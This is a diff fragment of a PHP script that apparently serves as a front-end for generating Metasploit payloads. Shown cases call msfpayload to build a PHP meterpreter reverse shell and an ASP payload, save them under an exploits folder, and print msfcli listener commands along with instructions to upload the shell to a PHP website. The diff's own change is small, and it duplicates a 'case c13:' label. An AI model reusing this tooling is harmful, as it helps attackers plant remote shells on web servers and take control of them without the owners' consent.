@@ -329,6 +329,7 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/shell/bind_tcp LHOST='.$ip.
                            
                         break;
                     case c13:
+                        case c13:
                         shell("echo '[Wait] While I generate your payload........'");
                         exec("sudo msfpayload php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.php");
                        
@@ -347,8 +348,8 @@ echo'<p>************************************************************************
 echo '<b>Note:</b> Upload this shell on website supporting PHP and start meterpreter listener ';
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
 echo 'sudo msfcli exploit/multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
-
                         break;
+                    
                     case c14:
                         shell("echo '[Wait] While i generate tour payload..........'");
                          exec("sudo sh cmd/quick/asp.sh $ip $port exploits/$pkg.asp");
